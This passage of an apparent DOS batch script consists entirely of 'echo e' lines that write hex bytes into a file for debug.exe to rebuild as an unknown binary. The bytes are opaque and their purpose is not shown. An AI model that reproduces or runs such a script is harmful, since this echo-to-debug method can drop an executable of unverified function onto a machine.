echo e 5280 E9 ED 75 30 96 EE 10 FC CC 79 AE 1E 30 0C EB 96>>j
echo e 5290 EF 5A 8B 70 22 DC A8 FC 67 BD 4C A7 38 FA 1A D3>>j
echo e 52A0 A3 34 9D CD 3B 9B FC 33 00 32 EF C7 D2 B3 6F 14>>j
echo e 52B0 B6 63 61 FF 00 02 A5 67 8A 65 57 56 F9 B3 CD 36>>j
echo e 52C0 E4 C8 58 EE 1D 2A D4 2F 1B A7 A9 D6 AC A3 66 8A>>j
echo e 52D0 37 31 A7 CA 8C D4 C3 12 24 7B 54 E4 53 AE 58 16>>j
echo e 52E0 E1 72 69 42 83 12 E3 EF 1E D4 A2 B9 35 66 31 F8>>j
echo e 52F0 9B B1 44 22 B1 0A 07 39 A9 92 D9 D4 B1 53 C0 A5>>j
echo e 5300 45 F2 EE 57 72 1C 13 D6 B5 ED 21 81 D9 C1 E4 1E>>j
echo e 5310 2B 7A 6D 6E CA 84 A2 9D E4 87 69 96 26 5B 5D CE>>j
echo e 5320 7B FF 00 53 56 EE 74 42 F6 F9 12 0E 47 7A 99 23>>j
echo e 5330 58 11 12 25 3B 6A FC F3 A0 88 00 79 03 9A E6 9A>>j
echo e 5340 6A A2 52 D1 19 63 65 29 24 A1 A5 CE 1F 50 D3 0D>>j
echo e 5350 B6 C7 77 04 67 18 AA E1 51 64 C8 FE 1A D5 F1 0B>>j
echo e 5360 7E E9 0A 8C E5 B3 9A C3 77 3C 10 0E 6B 4A 9E EC>>j
echo e 5370 BD D7 A1 94 68 C9 59 23 55 6E 0B 5C 45 CF C9 C0>>j
echo e 5380 AD 49 C0 89 72 9D 0E 79 AC B8 E3 51 6A AE 17 27>>j
echo e 5390 19 AD 5D 3E 25 BB 83 33 02 39 3C 54 AF 79 EA CD>>j
echo e 53A0 52 71 92 4D 18 37 5F BE 9C 1C F4 15 49 AD F2 C4>>j
echo e 53B0 81 F3 66 B6 35 3B 48 AD E6 CC 64 95 CE 73 59 EB>>j
echo e 53C0 95 24 9E 41 EF 4A A4 1E E8 DE 12 5B 32 C4 70 BC>>j
echo e 53D0 30 87 63 95 35 9B 77 29 92 6C 76 C5 6A 5D DC 2A>>j
echo e 53E0 D9 20 07 9A C6 72 24 97 AF 4A 21 27 7E 52 AC AD>>j
echo e 53F0 A1 3D AC 8A 88 D9 15 9D 3C 79 25 87 52 6B 62 1B>>j
echo e 5400 74 30 B3 13 DA B3 A5 50 54 62 B5 9B BE 91 E8 39>>j
echo e 5410 2B C5 94 0A B0 3C D5 8F 2C 79 6A 4D 47 3F 07 8A>>j
echo e 5420 55 39 50 09 E9 52 95 E3 73 CF 8D 3E 79 6A 6C 5A>>j
echo e 5430 B2 46 E8 3A E2 9D 2C BB E5 E3 B5 16 EA 9B A2 27>>j
echo e 5440 A9 A5 95 42 5C 10 AA 48 AE 67 56 A6 AA EE C7 A1>>j
echo e 5450 42 85 68 27 39 12 44 42 9E 6A 66 9B 0E 48 19 C0>>j
echo e 5460 E2 92 0B 75 70 24 72 47 B5 46 41 0C E4 74 CF 14>>j
echo e 5470 46 92 94 6F 7D 4F 67 0E A3 2A 6A 2F 73 3F 55 73>>j
echo e 5480 32 A4 9D 08 CE 7F 4A C1 99 B7 3E 73 5B FA A0 C5>>j
echo e 5490 B0 C1 EA 6B 9D 93 EF 57 45 28 B8 AB 33 C4 C7 41>>j
echo e 54A0 C2 76 7B 92 21 DF 84 03 93 C5 4D 0F FA 25 C9 DF>>j
echo e 54B0 CF 06 A1 B7 00 48 18 FA D5 C1 00 BA B9 61 9E 07>>j
echo e 54C0 A5 6F B6 A7 34 13 76 7D 4D 1D 3A 4F 3D 15 00 3C>>j
echo e 54D0 B5 75 DA 65 EB 59 5D 42 B2 39 DA 9C 62 B8 DB 39>>j
echo e 54E0 5A C4 06 08 59 41 38 FA D6 EC 53 BB C0 66 90 7C>>j
echo e 54F0 E4 6E AE 6A B0 6A 6B 9F 66 18 E9 54 70 51 4F 53>>j
echo e 5500 AD F1 66 B1 04 BA 23 86 5C AB 0E 2B C7 66 7F DE>>j
echo e 5510 29 5F 4F EB 5B FA 9E B6 D7 B6 09 6E 57 05 79 24>>j
echo e 5520 FD 2B 9C 7E 58 0A E9 71 51 7E EB D0 E7 85 3E 48>>j
echo e 5530 AE E6 A5 BB 6F B0 91 4F 52 32 2B 2D 57 73 6D F7>>j
echo e 5540 AB 10 5C 15 53 19 E8 46 2A 22 15 06 41 E7 35 29>>j
echo e 5550 BB D9 9A BB 69 72 39 13 63 11 4D A7 B1 DE 73 4C>>j
echo e 5560 A6 4C 96 BA 0F 0F C5 4B E6 10 32 DD EA BF 34 E2>>j
echo e 5570 72 31 4A C5 46 6D 17 E1 6C A0 A6 CE 9B 50 91 DE>>j
echo e 5580 A3 42 55 14 D4 E7 32 2E 0D 27 AE C7 6C 5F 34 2D>>j
echo e 5590 D4 A2 87 E6 E6 B4 22 7C 46 31 55 1E 20 8D C1 CD>>j
echo e 55A0 5C 88 0F 2C 55 45 46 5B B3 85 53 72 76 3A 2D 3C>>j
echo e 55B0 43 E5 BE FC 1A DE B7 8C 5C 46 A3 38 55 E9 5C BD>>j
echo e 55C0 98 37 5E 6B F2 06 73 8A D4 8E EF EC A1 62 C9 C9>>j
echo e 55D0 39 CD 79 F8 9A 95 1B 47 76 12 95 5E 47 39 32 0B>>j
echo e 55E0 F8 BC BB 92 17 A6 3B 56 CF 85 64 11 8B 90 4F CB>>j
echo e 55F0 90 7F 4A C6 B8 66 2E E0 9E AB 9A B1 A2 B3 8B 7B>>j
echo e 5600 86 07 92 40 FD 2B 4C 34 95 AE DE A6 F3 BA A2 F9>>j
echo e 5610 B7 3D 36 19 E1 FB 32 11 26 08 E3 19 A4 BF 65 10>>j
echo e 5620 2B 0E 7B D7 38 AC CF 0D B0 04 82 58 57 45 73 18>>j
echo e 5630 5B 45 05 B3 91 5D 37 D0 F3 DC 19 1E 90 E5 DD D8>>j
echo e 5640 F4 ED 59 77 32 15 BE 93 07 F8 8F F3 AD 0D 28 B2>>j
echo e 5650 33 82 73 8E 95 8B 78 C4 DF 4A 7F DA 3F CE A5 46>>j
echo e 5660 FB 09 2E 4D 59 D0 E9 D9 31 E4 7D E2 38 A7 5E C4>>j
echo e 5670 D2 43 10 91 72 43 55 0B 2B A3 1F 96 0E 47 4A DA>>j
echo e 5680 BB 8D A7 B7 89 D1 87 07 9A B6 9B 43 76 DD 1E 5B>>j
echo e 5690 E2 71 22 EB 8F C6 DC 70 BF 4C 9A B9 6F 72 06 96>>j
echo e 56A0 50 B7 CE 14 66 B4 35 DD 02 7B DD 61 E5 CE 36 2E>>j
echo e 56B0 47 EB 5C 93 CB 24 37 52 C2 4F 2A C5 78 E9 C5 67>>j
echo e 56C0 17 38 37 65 A0 54 8D 4A AE 31 81 7A F2 49 25 D3>>j
echo e 56D0 56 21 1B 33 6E E0 E2 9F A5 A2 42 55 65 40 1D 87>>j
echo e 56E0 39 15 66 D5 D2 48 63 8C 83 9C D5 1D 6A EE 3B 3D>>j
echo e 56F0 4D 54 67 1B 7A FE 75 9F 3B E7 B1 52 A6 D3 B3 66>>j
echo e 5700 5D E0 89 2E E7 C0 C0 CD 67 CC 43 C6 02 2E 4E 7B>>j
echo e 5710 55 99 A3 37 5E 6C AA DC 75 A8 AD 90 24 80 12 2B>>j
echo e 5720 46 FD E5 A9 DB 75 2F 75 74 18 85 60 65 C8 E7 AD>>j
echo e 5730 36 E2 44 66 72 07 26 9F 7B 19 6B B6 C7 6A A5 33>>j
echo e 5740 11 26 CC F7 A2 71 E6 9D CE 7A B1 6D A6 3A 12 C1>>j
echo e 5750 F2 47 15 71 59 18 F2 05 40 AA 59 40 A4 24 C4 E4>>j
echo e 5760 13 42 8D D9 A5 2A AA 9E 8C 6B 82 1C E0 66 A0 F2>>j
echo e 5770 DC 1C 95 EB 5A 09 10 78 CB 6E 02 A2 F2 C9 90 A6>>j
echo e 5780 E1 EC 69 35 24 F6 31 AB 69 5D A2 BA 33 A7 43 5A>>j
echo e 5790 16 92 37 96 4B 73 C1 AA 6F 0B A3 60 9A B1 14 8E>>j
echo e 57A0 B1 63 1C 0A 55 1B B5 8C 69 46 76 BD C6 49 20 CF>>j
echo e 57B0 02 A2 77 66 52 2A 76 55 23 71 35 03 60 EE C1 A2>>j
echo e 57C0 12 43 49 A5 A9 2C 2C E2 30 BB BA D5 C8 52 50 D9>>j
echo e 57D0 C1 AC D8 51 86 1C 9E 95 A2 97 B8 38 F6 AA FB 2E>>j
echo e 57E0 C7 4C 20 A5 4F 5D 09 FE D0 55 76 91 93 50 CD 72>>j
echo e 57F0 ED 20 C2 E1 45 31 65 12 12 C7 8C 0A B2 2D 95 A2>>j
echo e 5800 0F BA A2 34 92 5C D7 26 30 50 49 B2 2F 3C F9 83>>j
echo e 5810 69 E6 A6 8D A6 2E 46 09 CF 35 52 24 1F 68 01 39>>j
echo e 5820 62 78 AD 14 89 E1 93 E6 3F 31 E2 AE 50 6E 1A 1A>>j
echo e 5830 B6 99 25 A3 30 23 27 90 6B A2 B8 99 3C B1 C0 62>>j
echo e 5840 47 4A E5 C9 DB 21 3B BA 75 AB F6 93 19 E7 44 07>>j
echo e 5850 AF 15 14 93 8B 76 47 26 26 35 1B 4A 25 BC 41 1B>>j
echo e 5860 34 8E 99 18 E9 51 45 01 93 6C 88 40 0D D0 56 8B>>j
echo e 5870 69 44 B3 A1 7C 96 E9 52 CB A6 8B 48 91 77 7C C3>>j
echo e 5880 9C 54 CA AA 72 B0 7B 39 46 D7 32 AF AC 6E 94 30>>j
echo e 5890 31 9E 08 E8 3D A8 D2 61 9D 65 90 48 08 55 1D 3D>>j
echo e 58A0 EB 69 75 9B 79 25 10 ED F9 C8 0B C8 A8 96 E8 23>>j
echo e 58B0 39 DA 05 74 2E E6 B2 70 53 56 27 0A FB 06 46 0F>>j
echo e 58C0 61 55 A7 DF B1 89 18 26 A5 4B BF 3C F9 A4 70 BC>>j
echo e 58D0 53 2E 18 ED 24 9E 29 56 A7 ED 67 76 C9 9A E7 92>>j
echo e 58E0 65 74 82 09 63 DB 70 A3 07 A6 6B 3B 51 B2 C4 D9>>j
echo e 58F0 85 33 12 80 09 C5 5D 9C 99 21 07 A1 15 25 9D D4>>j
echo e 5900 2A 36 4A 09 04 11 44 60 B6 45 AB DE C8 C8 80 BA>>j
echo e 5910 5C 46 80 65 09 19 15 D0 5D DB B3 5B 62 D7 0B 93>>j
echo e 5920 D2 B3 5A 02 97 5E 62 8C 2E 72 07 B5 6D E9 9B A5>>j
echo e 5930 72 3D F3 8A 87 4D A9 34 67 52 4D 9C E4 E8 D1 AB>>j
echo e 5940 09 86 5B DF B5 63 B2 12 5C 83 91 5D 6F 89 ED CA>>j
echo e 5950 C8 84 63 E8 2B 99 FB 3B 61 F6 1E A7 14 E6 DA 8E>>j
echo e 5960 A6 34 A3 26 D9 93 33 BC AC 14 67 02 84 46 49 30>>j
echo e 5970 46 2B 43 EC FE 44 61 98 D5 5B 96 1B 83 2F A7 35>>j
echo e 5980 9D 39 75 3A 23 A2 6D 8E 0D 23 E5 10 E3 35 5E EA>>j
echo e 5990 DE 78 63 0C C8 42 9E 86 A5 B5 93 04 9F 7A D1 D4>>j
echo e 59A0 6E 92 E2 CA 28 54 0E 2B 55 3D 1A 46 B1 83 94 1B>>j
echo e 59B0 67 33 21 24 54 A9 19 28 33 C5 4F 3C 02 25 1C 72>>j
echo e 59C0 6A 34 20 49 C9 A4 96 87 2A 87 2B D4 D0 B3 F3 8C>>j
echo e 59D0 F1 82 30 A3 90 6B 7E CA 34 75 94 3A 82 DD 41 AC>>j
echo e 59E0 CB 59 E2 C2 47 8E 40 AD 1B 06 0D 2B E1 B1 C6 05>>j
echo e 59F0 67 2A 72 95 37 64 7D 06 1A 31 74 77 BB 2B 4E 4A>>j
echo e 5A00 C8 42 8C 2D 43 29 21 6A D4 E4 23 15 27 38 A8 A7>>j
echo e 5A10 8F 75 B9 7C 56 14 55 48 3B A4 70 E3 28 D6 BC 7D>>j
echo e 5A20 9D D2 32 EF C0 65 42 C7 E5 06 B0 EE C2 FD A0 EC>>j
echo e 5A30 1C 56 A6 A4 E5 23 41 59 13 72 F9 AE 9A 37 6A EC>>j
echo e 5A40 E3 C5 A9 46 5C AD DE C2 AF 38 C5 69 68 AC 16 FF>>j
echo e 5A50 00 F7 98 C6 0F 5A CC 43 8C 0A B3 6E DB AE 0B 03>>j
echo e 5A60 8E 2B A0 CA 9F C4 92 3B 78 2D 12 7B 6F 31 10 15>>j
echo e 5A70 56 3C D5 91 6C BE 43 06 18 18 C5 26 84 A6 3D 10>>j
echo e 5A80 06 39 DC 72 7F 4A 7C B3 81 04 A3 D1 6B 0C 44 5D>>j
echo e 5A90 4A 8A E7 5D 4A 2A 72 57 38 FD 66 DC 43 09 DA B8>>j
echo e 5AA0 1B B8 3E A2 B0 55 49 3C 75 AE 93 59 BA 5B AB 5B>>j
echo e 5AB0 75 41 CA A8 07 EB 58 6A 3C 97 3B C6 0E 2B 65 1E>>j
echo e 5AC0 55 63 9A 74 E2 A4 40 54 86 A4 28 F8 DC 41 C6 71>>j
echo e 5AD0 9A 9D A5 56 63 81 56 42 8B 84 8A 25 5C 10 72 69>>j
echo e 5AE0 5D 99 BA 69 EC CC F5 18 70 0F 14 F5 50 CC C4 74>>j
echo e 5AF0 A9 AE ED 9E 2B 8D A7 BF 43 50 0F 90 9A 1B D0 CD>>j
echo e 5B00 45 AD C9 11 40 5E 95 5C F5 35 30 6C 29 35 09 04>>j
echo e 5B10 7E 34 44 24 5C 81 D0 C3 B5 BA F6 A7 48 D8 5C 0A>>j
echo e 5B20 AA A0 E0 1A 9B 70 27 19 A1 69 7B 1D 34 E5 EE D9>>j
echo e 5B30 8D 50 C4 64 D5 A8 C1 D8 38 A8 91 81 C0 23 A5 58>>j
echo e 5B40 59 14 2E 2A 6D 72 E9 52 56 DC D5 D2 D9 96 DA 50>>j
echo e 5B50 A3 24 9A B1 34 9B A7 40 47 B5 1A 61 58 A0 90 9F>>j
echo e 5B60 5C 55 E9 ED E2 78 E2 28 3E 76 35 86 25 5A 7A 9E>>j
echo e 5B70 AA 49 44 96 E2 CD 17 F7 99 FB C3 F2 A5 D1 63 06>>j
echo e 5B80 D6 E3 1D 37 0A B3 7D 6F 2B 43 B5 14 96 0B 9E 94>>j
echo e 5B90 DD 22 26 82 D6 75 90 6D 62 47 15 B6 1E 9C 7D 93>>j
echo e 5BA0 91 8D 45 17 17 63 7A 22 04 76 C7 D1 87 F3 AE 9A>>j
echo e 5BB0 64 59 52 20 7A 11 9A E6 14 8F B3 43 8E A0 D7 4C>>j
echo e 5BC0 D9 3E 49 FF 00 66 9C 95 AD 76 79 D5 34 69 0D 8E>>j
echo e 5BD0 DD 2D D8 95 E3 35 CE EA 36 F2 A5 D3 90 33 B8 9E>>j
echo e 5BE0 95 D1 5C 16 6E 14 74 AA 78 DE 7E 70 32 29 A5 AD>>j
echo e 5BF0 D1 32 8F 32 33 2D E5 2F 3A 2B 71 B4 05 FC AB AB>>j
echo e 5C00 B2 2B 24 61 09 3C 57 32 D6 65 27 0E 7E 50 5B AD>>j
echo e 5C10 6D 23 7D 9E CD 5F 3D F3 9C D1 CD 64 62 B4 42 DF>>j
echo e 5C20 27 FA 64 A1 01 24 C6 DC FE 06 BC 82 E5 1F FB 4A>>j
echo e 5C30 E8 B1 E5 64 6C 9F C6 BD A2 DE 48 EE 12 43 90 58>>j
echo e 5C40 A1 FE 55 E5 7A AC 4B 6B 75 78 AC A7 97 27 91 EF>>j
echo e 5C50 5A C5 B7 06 CF 43 02 EE DA 2B 5B EA 3E 4A 21 65>>j
echo e 5C60 C8 53 D6 A9 EA 6C 97 DA 82 B9 3C 05 E4 54 57 2E>>j
echo e 5C70 3E C6 BB 47 25 AB 32 69 58 5D 93 92 2B 9A 09 49>>j
echo e 5C80 A2 2B 46 D3 D4 D3 18 09 22 44 0E CA AE 83 E7 07>>j
echo e 5C90 D2 A6 46 1F 60 76 53 F3 62 AA C6 E7 CE 5F 7A D6>>j
echo e 5CA0 A5 35 CF 64 6D 19 25 16 3A 7C 8B DC B1 C0 35 9F>>j
echo e 5CB0 71 86 BB 21 0E 46 6A 6D 4E 56 FB 61 19 E0 55 75>>j
echo e 5CC0 20 8C F7 A5 6D 0E 67 53 9D 58 9C 48 CB B4 7A 50>>j
echo e 5CD0 E4 33 64 D4 13 3F CA 30 6A 68 22 62 32 E7 15 0D>>j
echo e 5CE0 72 EA 89 92 BC 85 59 37 38 40 4E 2A 69 94 27 CE>>j
echo e 5CF0 0F 4A 88 2A 79 99 1D 05 3D 8E 50 E2 97 B4 6D 97>>j
echo e 5D00 4D 46 EE 22 AB 99 D4 91 C6 2A 55 C2 F0 0F 1D EA>>j
echo e 5D10 08 95 82 9D A0 D5 D4 22 20 9B D7 9E 3A 8A 55 93>>j
echo e 5D20 37 84 63 CB 61 B1 44 AE FB 4F 4C 64 D2 7D 9E 25>>j
echo e 5D30 2E 7B 13 57 26 91 36 01 1A 0C 9E B8 AA AE AD 83>>j
echo e 5D40 95 22 B4 A3 04 E0 E4 C8 6A 37 BD 89 A2 B5 B7 78>>j
echo e 5D50 4F CF 82 32 6A 93 C4 23 93 23 EE D5 DB 75 41 10>>j
echo e 5D60 6C FC D9 E9 56 2F ED 25 36 81 C4 79 E0 11 81 EB>>j
echo e 5D70 51 25 CB 60 95 E0 B6 28 5B 88 9A 36 62 4F D2 AF>>j
echo e 5D80 C2 B9 45 28 A4 C6 3A D5 3B 5D 32 FA 48 4B 2D B4>>j
echo e 5D90 85 4F FB 27 D2 B5 2D E4 F2 74 EF 21 93 0F 9E 72>>j
echo e 5DA0 39 ED 57 C8 A5 7B 32 61 17 3B DC 92 0B 4B 73 70>>j
echo e 5DB0 AD 8D B5 AD 0D A5 AC A8 5E 4E 48 3D 05 61 44 27>>j
echo e 5DC0 92 E9 55 51 8E 7D 8D 75 5A 14 66 38 E7 13 C7 CF>>j
echo e 5DD0 4F 98 7D 2B 9E 15 65 4E 2E E4 46 4B 95 DD 6A 64>>j
echo e 5DE0 5D E9 D6 EA C4 AA B0 52 39 AA B6 B1 47 14 88 F1>>j
echo e 5DF0 9C 91 5D 26 A1 E5 04 64 38 3C 57 37 69 01 4B 85>>j
echo e 5E00 2C 0E 33 5D 34 E5 CF 16 CD 21 2B 6A D1 D1 D8 CD>>j
echo e 5E10 95 2D 20 DC C3 A1 A4 9D CC 85 89 3C F6 CD 2C 32>>j
echo e 5E20 22 16 24 8D BE 94 92 20 94 19 10 60 76 AE 25 25>>j
echo e 5E30 19 D9 A2 EA 53 E6 8F 31 CB C7 E7 0D 50 30 52 70>>j
echo e 5E40 D5 B0 C8 EF 36 E2 78 3D 69 45 A9 92 E3 F7 64 64>>j
echo e 5E50 9A 76 D7 59 BC 97 20 15 FD 6B BD D9 C9 45 1C F0>>j
echo e 5E60 8A 90 BB 64 39 48 57 2A 0F 38 AB A2 25 30 E1 BA>>j
echo e 5E70 E2 AD 69 C9 B6 D5 C1 C6 6A B4 F2 AB 2B 8D EA 08>>j
echo e 5E80 A5 1B 34 D1 AC 6D 6D 4A 77 08 9E 48 C1 E7 A5 63>>j
echo e 5E90 DF 7F A3 4A A5 5B 39 15 6A E9 C0 DA 37 E3 1E F5>>j
echo e 5EA0 99 75 26 5B E6 39 F4 A8 AB 17 4D A6 82 76 49 4A>>j
echo e 5EB0 25 B1 A8 B3 6C 2C 3E E8 AD 8F 0F 6A 26 5B A6 5D>>j
echo e 5EC0 84 02 38 26 B9 88 22 2F 32 E5 BE 5C 8A DD 8E 48>>j
echo e 5ED0 6D 3F D4 B0 5E 73 D6 9F B5 E6 7A 9C D2 76 90 78>>j
echo e 5EE0 92 E4 B5 D2 B1 CE 07 1C 7E 35 9B 12 7E E1 9C 1E>>j
echo e 5EF0 BC D4 9A AD DA 48 C8 77 AB 67 D0 E6 A7 B7 82 47>>j
echo e 5F00 B5 12 24 2C 53 D4 0E 29 D5 8E 9A 8D 4B 95 E8 65>>j
echo e 5F10 B0 59 ED 1C B1 23 69 AC 8B 86 55 93 62 72 0D 6D>>j
echo e 5F20 5F E2 3B 32 A8 39 66 39 FD 2B 26 38 71 20 76 19>>j
echo e 5F30 E2 B3 A5 15 66 D1 AA 9A B5 91 1A 03 1F 51 8C D4>>j
echo e 5F40 F2 21 F2 D5 87 03 BD 2C 8B B9 83 0A 6C 8C 59 36>>j
echo e 5F50 93 8A 96 B9 6C 6C E6 E2 AC C4 6D B2 AF 3D 2A AB>>j
echo e 5F60 C0 03 E4 1A 5F B4 04 3B 00 CD 58 86 26 92 31 26>>j
echo e 5F70 3B D6 BC B7 D5 19 C6 9B AA EC 8A F1 DC 14 BA FA>>j
echo e 5F80 56 BD 9D E8 DE D8 5F 9A A0 9A D4 2A 06 DA 37 55>>j
echo e 5F90 5B 37 64 9D C9 1C D6 2A AC 92 7C A5 D0 A9 3A 12>>j
echo e 5FA0 69 9B 33 B0 6F DE 1E AD 52 39 3F 64 20 03 D0 56>>j
echo e 5FB0 6F 9B E6 1E 5A BB 18 63 B7 9A 08 63 01 4B 15 1C>>j
echo e 5FC0 0E F5 A5 09 4A 71 67 B9 1C 45 E9 F3 58 E0 75 64>>j
echo e 5FD0 3E 42 36 3A 93 FD 2B 2B CB DE 33 5D CF 8D 2C 05>>j
echo e 5FE0 B5 B4 0A B1 6D 1C 9C E3 E9 5C 4B 02 38 00 81 8A>>j
echo e 5FF0 54 F4 56 3C 1C 4D A5 51 C8 51 6E 9B 11 8B 75 38>>j
echo e 6000 35 2A C2 2D AE 33 9E 9D AA 38 D8 ED 19 EC 6A CB>>j
echo e 6010 44 F7 53 A8 88 16 38 E6 B7 71 BB D0 E6 8A F7 93>>j
echo e 6020 47 53 A4 DF 99 34 FD A4 63 07 15 6C 46 92 82 32>>j
echo e 6030 7E 61 83 5C FE 9F E6 5B 5B 6D 75 2A 77 1C 82 31>>j
echo e 6040 5D 4D B4 61 AD D0 81 9C 80 73 53 1D 53 4D 9E 9C>>j
echo e 6050 65 19 C6 FD 4E 6B 5D D2 E3 B3 B4 49 63 27 86 C9>>j
echo e 6060 FF 00 0A E5 6E 25 32 C9 B8 D7 A5 F8 9E 34 FF 00>>j
echo e 6070 84 6D C9 03 70 E8 6B CC 1C 10 DC 8A A5 1E 54 B5>>j
echo e 6080 3C DC 57 C5 A0 D0 70 6A ED 94 E5 6E 10 FA 55 2A>>j
echo e 6090 91 37 23 83 8A 4C C2 9C AC CB D7 73 99 E5 0D E8>>j
echo e 60A0 31 54 C8 2C C6 A6 56 00 9D DC D4 3C 92 71 D0 9A>>j
echo e 60B0 19 B4 DD D6 83 09 38 FA 53 09 26 AC 30 02 2E 9C>>j
echo e 60C0 D4 01 09 19 02 84 61 24 EF 61 43 90 B8 A0 13 BA>>j
echo e 60D0 A6 45 5D 9C 8E 68 88 28 97 24 71 43 D8 AE 57 A6>>j
echo e 60E0 A4 F1 A6 E5 CD 3B 6D 2A 4A A7 21 45 2E 41 A8 94>>j
echo e 60F0 6E CF 42 3C BC AB 53 4E C6 46 55 74 73 D6 B5 CD>>j
echo e 6100 CA 83 6D 80 72 1A B9 F8 AE 09 01 B1 D3 AD 6B C5>>j
echo e 6110 87 8A 27 07 80 79 F6 A9 71 E6 B5 CE F8 F2 B8 FB>>j
echo e 6120 A7 5D 23 32 CE C4 F4 29 8A 4B 3B 49 2F 9A 62 9D>>j
echo e 6130 01 19 FC A9 04 AB 3C E2 32 40 3B 78 15 D2 68 F6>>j
echo e 6140 B0 47 1B F9 6F 96 24 6E E6 A9 46 4A FD 8E 1A 95>>j
echo e 6150 6C B4 2B 5B E9 12 2A 2B 31 E0 1C D5 CB BB 8F 28>>j
echo e 6160 A2 A9 FB A2 B5 1D 7F 73 80 78 02 A9 DE 5B 47 F6>>j
echo e 6170 72 F8 F9 BD 68 69 C8 E2 77 6C 86 3B D4 93 8C F2>>j
echo e 6180 69 8E 54 9C 83 CE 6B 2C 48 22 B8 FC 2A CD B6 F6>>j
echo e 6190 67 66 E9 DA B5 85 34 95 CA 8B B6 85 BB F9 16 3B>>j
echo e 61A0 14 24 7A 54 31 48 6E 6D D6 10 DD 48 A9 B5 18 C4>>j
echo e 61B0 9A 5E 07 50 2B 3E C5 F6 84 0D C5 65 E6 CC AC DC>>j
echo e 61C0 B5 35 62 3F D9 F2 2E 79 C8 C5 72 DE 2A D2 A5 B9>>j
echo e 61D0 82 EA F0 10 17 AA E0 7B D7 54 D0 8B A7 5C B7 00>>j
echo e 61E0 7A D4 7A C6 9D BB 44 B8 89 5B B6 7D 6A D6 AB 43>>j
echo e 61F0 6A 37 8C D5 8F 23 B7 B0 79 E3 58 8B 85 39 E0 D5>>j
echo e 6200 2D 62 CA 5B 7B C0 87 80 06 01 C7 5A DF 9E 33 62>>j
echo e 6210 A8 CC 8E 18 E3 B5 66 6A 04 DF 5D 07 25 B0 07 14>>j
echo e 6220 94 2D A9 D5 5A 9F 33 F7 35 32 E3 BB D9 09 42 7B>>j
echo e 6230 62 96 29 4C 92 E1 71 9A A7 34 78 95 F1 C0 14 40>>j
echo e 6240 FE 5B 82 7A 52 77 31 8C 9A 7C B2 2E DE C0 64 97>>j
echo e 6250 78 3D 7A D5 65 B6 7F 2D 9C 11 81 56 24 9B 7B 7B>>j
echo e 6260 51 82 20 60 3A 1A 29 C2 4D EA 53 A3 1B B6 B6 2A>>j
echo e 6270 44 47 98 37 55 B7 95 64 C6 D1 F5 A8 21 8B 7B F3>>j
echo e 6280 4F 44 F2 77 66 9D 4D 15 91 31 8C F9 74 5A 0F 55>>j
echo e 6290 FD E0 1E B5 62 48 8C 78 26 A3 50 01 56 06 9D 2C>>j
echo e 62A0 C6 4F 94 56 31 7F 79 BD 28 C6 2B 5D C9 6D 51 A5>>j
echo e 62B0 0D 83 8C 53 E7 8C 87 DC CD 9C 0A AF 0C CF 06 EC>>j
echo e 62C0 77 A0 CC D2 B8 DC 78 27 15 AD AF 6B A1 72 A6 C9>>j
echo e 62D0 A2 9B F7 98 F6 AD 3B 2D 3E 7D 49 5D 95 86 06 47>>j
echo e 62E0 26 B3 0C 2A 8D 95 39 AD 6D 26 E5 ED AD E4 DB DC>>j
echo e 62F0 D6 73 52 8E CB 43 5A 69 BF 75 EC 45 3E 8F 34 04>>j
echo e 6300 12 E3 03 9A 2D 2E E5 F3 D6 12 D9 ED CD 59 9E EA>>j
echo e 6310 59 1C 07 07 04 8F CA 9F 06 9D 19 BB 57 07 8E 4D>>j
echo e 6320 62 A3 3A B7 4D 1B D4 A7 15 1F 77 72 FB 5F 9D 3A>>j
echo e 6330 2C 36 0E E1 9E 2B 3D E0 93 52 91 67 8D 95 55 9B>>j
echo e 6340 18 AB 77 96 51 C8 14 3B 1A 86 16 4B 4C 46 A4 FC>>j
echo e 6350 AD 91 5D F8 7C 3C 61 1E 67 B9 C5 4F 9A 5A 75 37>>j
echo e 6360 6C 74 39 6D AE A1 92 47 5C 1E A3 35 6B 55 9C 5B>>j
echo e 6370 4A 51 38 19 E4 81 DE B2 4E B7 34 93 47 9C 84 51>>j
echo e 6380 C5 4D 25 C8 D4 43 B7 5C 9D DC 57 05 54 DC EE F6>>j
echo e 6390 07 46 A2 6A 52 45 57 32 49 BA 40 72 3B E6 9A 00>>j
echo e 63A0 34 92 82 9F 20 3C 62 A3 46 DE C0 13 5D 31 D7 E1>>j
echo e 63B0 D8 B4 9A 4E E6 8C 51 C6 11 94 BE 7B 55 98 B7 9B>>j
echo e 63C0 46 2A B9 03 8A AD 02 6D C8 27 35 21 B9 FB 34 52>>j
echo e 63D0 2E 40 C8 E2 B2 9D 2D 2E 96 A1 79 95 E0 B9 30 C8>>j
echo e 63E0 1C AE 36 9A BB 75 6D 15 CB 47 28 CA BF 7F 7C D7>>j
echo e 63F0 30 6E DA 56 75 24 72 78 A7 4D E2 29 2D F1 19 5C>>j
echo e 6400 A8 E3 35 5E F7 CC C2 29 C6 F7 3A 8B 69 96 05 31>>j
echo e 6410 17 CB 9C E2 B3 56 22 C5 DD CF F1 53 74 82 9A A4>>j
echo e 6420 6F 70 09 56 42 31 FE 7F 0A 47 F3 04 8C BC 91 9A>>j
echo e 6430 DA 14 DB 91 94 A0 DE 91 29 6A AB 19 D8 57 D7 9A>>j
echo e 6440 8D 34 A7 BC 4F 35 4F 03 B6 6A 3D 59 99 23 5C A9>>j
echo e 6450 03 34 69 9A B1 86 06 07 9C FB D2 C4 46 51 56 88>>j
echo e 6460 DA B4 6C C7 49 64 F0 29 F9 B9 15 42 2D ED 21 CB>>j
echo e 6470 93 DA B4 5E F8 5C 3B 64 60 1E 2A 02 AB 14 BB 87>>j
echo e 6480 4A E7 A4 AC B5 DC 95 65 6B 95 7E C9 23 B8 C9 E9>>j
echo e 6490 D3 35 DB D8 DC 2C 5A 2C 76 FB 41 7D BF D2 B9 B8>>j
echo e 64A0 D5 27 6D C7 80 2B 56 1C C6 A0 82 70 07 15 B4 9B>>j
echo e 64B0 EA 68 97 33 76 29 EA 1A 71 FB 27 9A 4E 09 6E 95>>j
echo e 64C0 8F 71 6F E4 15 19 07 22 BA 0D 42 E1 DE CC A2 73>>j
echo e 64D0 CE 6B 9D BE 66 77 4F 61 CD 2E 59 5E DD 0C E5 78>>j
echo e 64E0 2B 10 38 CF 4A AD 3F FA BC 93 83 53 C8 76 3E 33>>j
echo e 64F0 C1 A6 CD 01 78 FA FB 8A 8E 56 DB 34 6D CA 26 60>>j
echo e 6500 89 9A 4C E7 81 5D 05 93 2C 76 20 9C 1E F5 8F F6>>j
echo e 6510 77 65 C6 71 5A 96 AB 9B 70 9D 48 E2 BA A8 D3 8F>>j
